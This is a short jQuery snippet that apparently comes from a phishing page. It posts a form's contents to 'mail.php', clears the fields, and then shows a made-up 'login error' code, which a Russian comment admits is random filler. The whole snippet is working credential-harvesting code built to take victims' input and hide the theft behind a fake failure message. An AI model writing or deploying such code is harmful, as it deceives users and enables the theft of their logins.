function submitg(){
    var data = $('#form').serialize();
    $.ajax({
        type: "POST",
        url: "mail.php",
        data:data
    }).done(function() {
        $('#form').find("input").val("");
        alert("Ошибка входа 0x00004xfce"); // Ошибка тут вообще рандомная, надо было что-то написать
    });
    return false;
};